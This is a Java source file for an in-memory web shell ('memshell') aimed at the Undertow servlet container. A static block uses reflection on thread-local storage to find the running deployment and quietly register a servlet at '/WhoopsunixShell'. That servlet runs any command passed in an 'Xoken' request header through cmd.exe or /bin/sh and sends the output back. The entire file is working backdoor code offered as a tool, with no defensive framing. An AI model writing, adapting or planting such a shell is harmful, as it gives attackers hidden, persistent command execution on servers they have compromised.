package com.example.undertow.memshell;

import io.undertow.servlet.api.ServletInfo;

import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import java.io.InputStream;
import java.io.PrintWriter;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Map;

/**
 * @author Whoopsunix
 */
public class UndertowServletExecMS implements Servlet {
    private static String NAME = "Whoopsunix";
    private static String PATTERN = "/WhoopsunixShell";
    private static String HEADER = "Xoken";


    static {
        try {
            UndertowServletExecMS undertowServletExecMS = new UndertowServletExecMS();

            Object threadLocals = getFieldValue(Thread.currentThread(), "threadLocals");
            Object[] table = (Object[]) getFieldValue(threadLocals, "table");

            for (int i = 0; i < table.length; i++) {
                Object entry = table[i];
                if (entry == null)
                    continue;
                Object value = getFieldValue(entry, "value");
                if (value == null)
                    continue;

                try {
                    if (value.getClass().getName().equals("io.undertow.servlet.handlers.ServletRequestContext")) {
                        if (isInject(value, undertowServletExecMS)) {
                            break;
                        }
                        inject(value, undertowServletExecMS);
                    }
                } catch (Exception e) {

                }
            }
        } catch (Exception e) {

        }
    }

    public static boolean isInject(Object servletRequestContext, Object object) {
        try {
            Object deployment = getFieldValue(servletRequestContext, "deployment");
            Object deploymentInfo = getFieldValue(deployment, "deploymentInfo");
            Map servlets = (Map) getFieldValue(deploymentInfo, "servlets");
            if (servlets.containsKey(NAME)) {
                return true;
            }

        } catch (Exception e) {

        }
        return false;
    }

    public static void inject(Object servletRequestContext, Object object) {
        try {
            Object deployment = getFieldValue(servletRequestContext, "deployment");
            Object deploymentInfo = getFieldValue(deployment, "deploymentInfo");
            Object servletInfo = Class.forName("io.undertow.servlet.api.ServletInfo").getConstructor(String.class, Class.class).newInstance(NAME, object.getClass());
            invokeMethod(servletInfo, "addMapping", new Class[]{String.class}, new Object[]{PATTERN});
            invokeMethod(deploymentInfo, "addServlet", new Class[]{Class.forName("io.undertow.servlet.api.ServletInfo")}, new Object[]{servletInfo});

            Object servlets = getFieldValue(deployment, "servlets");
            invokeMethod(servlets, "addServlet", new Class[]{Class.forName("io.undertow.servlet.api.ServletInfo")}, new Object[]{servletInfo});
        } catch (Exception e) {
            e.printStackTrace();
        }
    }


    public void service(ServletRequest servletRequest, ServletResponse servletResponse) {
        try {
            HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
            String cmd = httpServletRequest.getHeader(HEADER);
            if (cmd == null) {
                return;
            }
            String result = exec(cmd);
            PrintWriter printWriter = servletResponse.getWriter();
            printWriter.println(result);
        } catch (Exception e) {

        }
    }

    public UndertowServletExecMS() {

    }

    public void init(ServletConfig servletConfig) throws ServletException {

    }

    public ServletConfig getServletConfig() {
        return null;
    }


    public String getServletInfo() {
        return null;
    }


    public void destroy() {

    }

    public static String exec(String str) {
        try {
            String[] cmd = null;
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmd = new String[]{"cmd.exe", "/c", str};
            } else {
                cmd = new String[]{"/bin/sh", "-c", str};
            }
            if (cmd != null) {
                InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
                String execresult = exec_result(inputStream);
                return execresult;
            }
        } catch (Exception e) {

        }
        return "";
    }

    public static String exec_result(InputStream inputStream) {
        try {
            byte[] bytes = new byte[1024];
            int len = 0;
            StringBuilder stringBuilder = new StringBuilder();
            while ((len = inputStream.read(bytes)) != -1) {
                stringBuilder.append(new String(bytes, 0, len));
            }
            return stringBuilder.toString();
        } catch (Exception e) {
            return "";
        }
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) {
        try {
            Method method;
            try {
                method = obj.getClass().getDeclaredMethod(methodName, argsClass);
            } catch (NoSuchMethodException e) {
                method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
            }
            method.setAccessible(true);
            Object object = method.invoke(obj, args);
            return object;
        } catch (Exception e) {

        }
        return null;
    }
}
